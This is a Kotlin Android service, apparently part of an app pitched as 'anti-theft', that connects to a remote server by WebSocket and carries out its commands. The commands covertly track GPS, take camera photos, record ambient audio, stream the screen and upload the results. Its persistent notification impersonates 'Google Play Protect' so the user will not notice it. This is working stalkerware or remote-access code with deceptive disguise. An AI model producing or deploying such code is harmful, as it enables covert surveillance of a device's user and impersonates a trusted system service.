package com.androidprotect

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.location.Location
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.ImageReader
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import com.androidprotect.helpers.AudioHelper
import com.androidprotect.helpers.CameraHelper
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.booleanOrNull
import kotlinx.serialization.json.intOrNull
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString.Companion.toByteString
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.IOException
import java.util.concurrent.TimeUnit

class AntiTheftService : LifecycleService() {

    companion object {
        const val CHANNEL_ID = "antitheft_security_channel"
        const val NOTIFICATION_ID = 998877
        
        // Static configuration variables populated by MainActivity
        var serverIpAddress: String = "192.168.1.100" // Default fallback
        var isServiceRunning = false
        
        // Storage for screen capture token
        var mediaProjectionResultCode: Int = 0
        var mediaProjectionData: Intent? = null
    }

    private lateinit var deviceId: String
    private lateinit var modelName: String

    // Helpers & Clients
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var cameraHelper: CameraHelper
    private lateinit var audioHelper: AudioHelper
    private var okHttpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.MILLISECONDS) // infinite timeout for WebSocket
        .build()

    // Active resources
    private var webSocket: WebSocket? = null
    private var locationCallback: LocationCallback? = null
    private var mediaPlayer: MediaPlayer? = null
    
    // Screen Capture state
    private var mediaProjectionManager: MediaProjectionManager? = null
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var screenCaptureThread: HandlerThread? = null
    private var screenCaptureHandler: Handler? = null
    private var isScreenStreaming = false
    private var lastFrameTime = 0L

    override fun onCreate() {
        super.onCreate()
        Log.d("AntiTheftService", "Service onCreate")
        isServiceRunning = true
        
        // Generate Unique ID and Model Name
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "android_dev"
        modelName = "${Build.MANUFACTURER} ${Build.MODEL}"
        
        // Init Helpers
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        cameraHelper = CameraHelper(this)
        audioHelper = AudioHelper(this)
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        
        // Start Foreground Notification
        startForegroundNotification()
        
        // Establish Server WebSocket connection
        connectToServer()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        Log.d("AntiTheftService", "Service onStartCommand")
        
        // In case IP was updated, reconnect
        val ipFromIntent = intent?.getStringExtra("SERVER_IP")
        if (ipFromIntent != null && ipFromIntent != serverIpAddress) {
            serverIpAddress = ipFromIntent
            connectToServer()
        }
        
        return START_STICKY
    }

    private fun startForegroundNotification() {
        // Disguise notification to bypass thief's attention
        val channelName = "Serviços de Otimização do Sistema"
        val channelDescription = "Gerencia consumo de bateria e proteção de integridade."
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, 
                channelName, 
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = channelDescription
                setShowBadge(false)
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }

        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 
            0, 
            notificationIntent, 
            PendingIntent.FLAG_IMMUTABLE
        )

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Serviços do Google Play Protect")
            .setContentText("Dispositivo otimizado e protegido em tempo real.")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    // Connect to WebSocket Server
    private fun connectToServer() {
        webSocket?.close(1000, "Reconnecting")
        
        val url = "ws://$serverIpAddress:8080/ws/device/$deviceId" +
                "?model=${UriEncoder.encode(modelName)}" +
                "&battery=${getBatteryPercentage()}" +
                "&charging=${isDeviceCharging()}"
        
        Log.d("AntiTheftService", "Connecting to WebSocket: $url")
        
        val request = Request.Builder()
            .url(url)
            .build()
        
        webSocket = okHttpClient.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d("AntiTheftService", "WebSocket opened successfully")
                sendTelemetry()
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d("AntiTheftService", "Received WebSocket command: $text")
                handleRemoteCommand(text)
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e("AntiTheftService", "WebSocket failure: ${t.message}. Retrying in 5s...")
                Handler(Looper.getMainLooper()).postDelayed({
                    connectToServer()
                }, 5000)
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.d("AntiTheftService", "WebSocket closed: $reason. Retrying in 5s...")
                Handler(Looper.getMainLooper()).postDelayed({
                    connectToServer()
                }, 5000)
            }
        })
    }

    // Process incoming control panel commands
    private fun handleRemoteCommand(jsonString: String) {
        try {
            val root = Json.parseToJsonElement(jsonString).jsonObject
            val command = root["command"]?.jsonPrimitive?.content ?: return
            
            when (command) {
                "PING" -> sendTelemetry()
                "START_LOCATION" -> startLocationTracking()
                "STOP_LOCATION" -> stopLocationTracking()
                
                "TAKE_PHOTO" -> {
                    val cameraType = root["camera"]?.jsonPrimitive?.content ?: "front"
                    val useFront = cameraType == "front"
                    takeAndUploadPhoto(useFront)
                }
                
                "RECORD_AUDIO" -> {
                    val duration = root["duration"]?.jsonPrimitive?.intOrNull ?: 15
                    recordAndUploadAudio(duration)
                }
                
                "START_SCREEN_STREAM" -> startScreenStreaming()
                "STOP_SCREEN_STREAM" -> stopScreenStreaming()
                
                "PLAY_ALARM" -> playLoudAlarm()
                else -> Log.w("AntiTheftService", "Unknown command: $command")
            }
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Error parsing remote command: ${e.message}", e)
        }
    }

    // Telemetry Update Dispatcher
    private fun sendTelemetry(lat: Double? = null, lng: Double? = null, accuracy: Float? = null) {
        try {
            val telemetryMap = mutableMapOf<String, String>()
            telemetryMap["type"] = "TELEMETRY"
            telemetryMap["deviceId"] = deviceId
            telemetryMap["battery"] = getBatteryPercentage().toString()
            telemetryMap["isCharging"] = isDeviceCharging().toString()
            
            if (lat != null && lng != null) {
                telemetryMap["lat"] = lat.toString()
                telemetryMap["lng"] = lng.toString()
                telemetryMap["accuracy"] = accuracy.toString()
            }
            
            val jsonStr = Json.encodeToString(telemetryMap)
            webSocket?.send(jsonStr)
            Log.d("AntiTheftService", "Telemetry sent: $jsonStr")
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Failed to send telemetry: ${e.message}")
        }
    }

    // Real-Time Location Tracker
    @SuppressLint("MissingPermission")
    private fun startLocationTracking() {
        if (locationCallback != null) return // Already running
        
        Log.d("AntiTheftService", "Starting GPS tracking...")
        val locationRequest = LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY, 
            10000L // 10 seconds interval
        ).apply {
            setMinUpdateIntervalMillis(5000L) // Fastest interval
            setMinUpdateDistanceMeters(1.0f) // 1 meter movement sensitivity
        }.build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                val loc: Location = locationResult.lastLocation ?: return
                sendTelemetry(loc.latitude, loc.longitude, loc.accuracy)
            }
        }

        try {
            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback!!,
                Looper.getMainLooper()
            )
            sendConsoleLog("Rastreamento GPS iniciado no dispositivo.")
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Error requesting GPS updates: ${e.message}")
            sendConsoleLog("Erro ao iniciar rastreamento GPS: ${e.message}")
        }
    }

    private fun stopLocationTracking() {
        locationCallback?.let {
            fusedLocationClient.removeLocationUpdates(it)
            locationCallback = null
            Log.d("AntiTheftService", "Stopped GPS tracking.")
            sendConsoleLog("Rastreamento GPS interrompido.")
        }
    }

    // Capture and upload background cameras photos
    private fun takeAndUploadPhoto(useFrontCamera: Boolean) {
        sendConsoleLog("Iniciando captura headless da câmera ${if (useFrontCamera) "FRONTAL" else "TRASEIRA"}...")
        cameraHelper.takeBackgroundPhoto(this, useFrontCamera) { file ->
            if (file != null) {
                sendConsoleLog("Foto capturada! Enviando arquivo para o servidor...")
                uploadFile(file, "/upload/photo/$deviceId", "photo")
            } else {
                sendConsoleLog("Falha ao capturar foto pela câmera.")
            }
        }
    }

    // Record background audio and upload
    private fun recordAndUploadAudio(durationSeconds: Int) {
        sendConsoleLog("Gravando áudio ambiente por $durationSeconds segundos...")
        audioHelper.startRecording(durationSeconds) { file ->
            if (file != null) {
                sendConsoleLog("Áudio gravado com sucesso! Enviando para o servidor...")
                uploadFile(file, "/upload/audio/$deviceId", "audio")
            } else {
                sendConsoleLog("Falha ao gravar áudio ambiente.")
            }
        }
    }

    // HTTP Multipart Uploader
    private fun uploadFile(file: File, path: String, fileFieldName: String) {
        val serverUrl = "http://$serverIpAddress:8080$path"
        
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart(
                fileFieldName, 
                file.name, 
                file.asRequestBody("application/octet-stream".toMediaType())
            )
            .build()
            
        val request = Request.Builder()
            .url(serverUrl)
            .post(requestBody)
            .build()
            
        okHttpClient.newCall(request).enqueue(object : Callback {
            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (response.isSuccessful) {
                        Log.d("AntiTheftService", "File uploaded successfully to $path")
                        sendConsoleLog("Arquivo de mídia enviado com sucesso!")
                    } else {
                        Log.e("AntiTheftService", "File upload failed: Code ${response.code}")
                        sendConsoleLog("Erro no servidor ao receber arquivo: Código ${response.code}")
                    }
                    // Delete temp file after upload
                    file.delete()
                }
            }

            override fun onFailure(call: Call, e: IOException) {
                Log.e("AntiTheftService", "File upload network failure: ${e.message}", e)
                sendConsoleLog("Falha de rede ao enviar arquivo: ${e.message}")
                file.delete()
            }
        })
    }

    // Real-time Screen Streaming core
    private fun startScreenStreaming() {
        if (isScreenStreaming) return
        
        val resultCode = mediaProjectionResultCode
        val intentData = mediaProjectionData
        
        if (resultCode == 0 || intentData == null) {
            sendConsoleLog("Transmissão de tela falhou: Permissão não concedida no celular. Abra o app.")
            return
        }

        try {
            mediaProjection = mediaProjectionManager?.getMediaProjection(resultCode, intentData)
            if (mediaProjection == null) {
                sendConsoleLog("Erro ao inicializar MediaProjection. Abra o app novamente.")
                return
            }
            
            isScreenStreaming = true
            sendConsoleLog("Transmissão de tela aceita pelo usuário. Iniciando captura de frames...")

            // Setup display parameters
            val width = 360
            val height = 640 // Lower resolution to compress easily and reduce bandwidth
            val dpi = resources.displayMetrics.densityDpi
            
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            
            virtualDisplay = mediaProjection!!.createVirtualDisplay(
                "ScreenShare",
                width,
                height,
                dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader!!.surface,
                null,
                null
            )
            
            // Background HandlerThread for Frame Compression
            screenCaptureThread = HandlerThread("ScreenCaptureThread").apply { start() }
            screenCaptureHandler = Handler(screenCaptureThread!!.looper)
            
            imageReader!!.setOnImageAvailableListener({ reader ->
                try {
                    val now = System.currentTimeMillis()
                    // Cap frame rate at ~6 FPS (at least 150ms between frames) to optimize CPU/socket
                    if (now - lastFrameTime < 150) {
                        val image = reader.acquireLatestImage()
                        image?.close()
                        return@setOnImageAvailableListener
                    }
                    
                    val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                    lastFrameTime = now
                    
                    val planes = image.planes
                    val buffer = planes[0].buffer
                    val pixelStride = planes[0].pixelStride
                    val rowStride = planes[0].rowStride
                    val rowPadding = rowStride - pixelStride * width
                    
                    val bitmap = Bitmap.createBitmap(
                        width + rowPadding / pixelStride, 
                        height, 
                        Bitmap.Config.ARGB_8888
                    )
                    bitmap.copyPixelsFromBuffer(buffer)
                    image.close()
                    
                    // Slice padding if present
                    val cleanBitmap = if (rowPadding > 0) {
                        Bitmap.createBitmap(bitmap, 0, 0, width, height)
                    } else {
                        bitmap
                    }
                    
                    // Compress to highly efficient JPEG
                    val outStream = ByteArrayOutputStream()
                    cleanBitmap.compress(Bitmap.CompressFormat.JPEG, 45, outStream)
                    val jpegBytes = outStream.toByteArray()
                    
                    // Recycle resources
                    if (cleanBitmap != bitmap) {
                        cleanBitmap.recycle()
                    }
                    bitmap.recycle()
                    
                    // Send JPEG as Binary WebSocket Frame
                    webSocket?.send(jpegBytes.toByteString())
                    
                } catch (e: Exception) {
                    Log.e("AntiTheftService", "Error processing screen frame: ${e.message}")
                }
            }, screenCaptureHandler)
            
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Screen stream crash: ${e.message}", e)
            sendConsoleLog("Erro na transmissão de tela: ${e.message}")
            stopScreenStreaming()
        }
    }

    private fun stopScreenStreaming() {
        if (!isScreenStreaming) return
        
        Log.d("AntiTheftService", "Stopping screen capture...")
        isScreenStreaming = false
        
        try {
            imageReader?.setOnImageAvailableListener(null, null)
            imageReader?.close()
            imageReader = null
            
            virtualDisplay?.release()
            virtualDisplay = null
            
            mediaProjection?.stop()
            mediaProjection = null
            
            screenCaptureThread?.quitSafely()
            screenCaptureThread = null
            screenCaptureHandler = null
            
            sendConsoleLog("Transmissão de tela finalizada.")
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Failed to clean up screen stream: ${e.message}")
        }
    }

    // Play Security Siren Alarm (bypassing silent mode)
    private fun playLoudAlarm() {
        if (mediaPlayer?.isPlaying == true) {
            mediaPlayer?.stop()
            mediaPlayer?.release()
            mediaPlayer = null
            sendConsoleLog("Sirene de segurança desligada.")
            return
        }

        try {
            val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
                
            mediaPlayer = MediaPlayer().apply {
                setDataSource(this@AntiTheftService, alarmUri)
                setAudioAttributes(
                    AudioAttributes.Builder()
                        .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                        .setUsage(AudioAttributes.USAGE_ALARM)
                        .build()
                )
                isLooping = true
                prepare()
            }
            
            // Set alarm volume to MAX in manager
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            audioManager.setStreamVolume(
                AudioManager.STREAM_ALARM,
                audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM),
                0
            )
            
            mediaPlayer?.start()
            sendConsoleLog("ALERTA SONORO DISPARADO! Emitindo sirene em volume MÁXIMO.")
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Alarm playback error: ${e.message}", e)
            sendConsoleLog("Erro ao disparar alarme: ${e.message}")
        }
    }

    // Helper to log dynamic events to the dashboard console
    private fun sendConsoleLog(logMessage: String) {
        try {
            val logMap = mapOf(
                "type" to "LOG",
                "deviceId" to deviceId,
                "message" to logMessage
            )
            webSocket?.send(Json.encodeToString(logMap))
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Failed to send console log: ${e.message}")
        }
    }

    // Battery Metrics Helper
    private fun getBatteryPercentage(): Int {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun isDeviceCharging(): Boolean {
        val batteryStatus = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        return status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null // Started service
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("AntiTheftService", "Service onDestroy")
        isServiceRunning = false
        
        // Clean up resources
        stopLocationTracking()
        stopScreenStreaming()
        
        mediaPlayer?.stop()
        mediaPlayer?.release()
        mediaPlayer = null
        
        webSocket?.close(1000, "Service destroyed")
    }
}

// Simple dynamic URI Encoder for safe characters since standard URLEncoder creates '+' signs for spaces
object UriEncoder {
    fun encode(s: String): String {
        val sb = StringBuilder()
        for (c in s) {
            if (c in 'a'..'z' || c in 'A'..'Z' || c in '0'..'9' || c == '-' || c == '_' || c == '.' || c == '~') {
                sb.append(c)
            } else {
                sb.append(String.format("%%%02X", c.code))
            }
        }
        return sb.toString()
    }
}
